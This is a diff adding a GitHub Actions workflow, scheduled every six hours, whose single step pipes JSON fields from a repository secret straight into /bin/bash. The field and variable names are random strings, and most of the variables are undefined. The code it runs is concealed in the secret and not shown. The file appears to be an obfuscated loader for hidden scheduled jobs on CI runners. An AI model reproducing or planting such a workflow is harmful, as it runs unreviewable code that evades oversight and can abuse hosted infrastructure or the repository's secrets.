@@ -1,0 +1,29 @@
+name: guanxiangyugong
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: guanxiangyugong
+        env:
+          afec78859: ${{ secrets.afec78859 }}
+        run: |
+          echo $afec78859 | jq -r .iehv65 | /bin/bash
+          echo $d0188 | jq -r .yb9952 | /bin/bash
+          echo $gawy4 | jq -r .k6 | /bin/bash
+          echo $cqsm07444 | jq -r .dydu42653 | /bin/bash
+          echo $ur5 | jq -r .btnf97801 | /bin/bash
+          echo $pdhu49609 | jq -r .yfobo1 | /bin/bash
+          echo $wyfpj9 | jq -r .dzo4479 | /bin/bash
+          echo $dic974 | jq -r .joopl1045 | /bin/bash
+          echo $ubqj82442 | jq -r .rl19736 | /bin/bash
+          echo $txa922 | jq -r .wxh77781 | /bin/bash
+          echo $ok6349 | jq -r .sec227 | /bin/bash
+          echo $v75 | jq -r .hk2 | /bin/bash
+
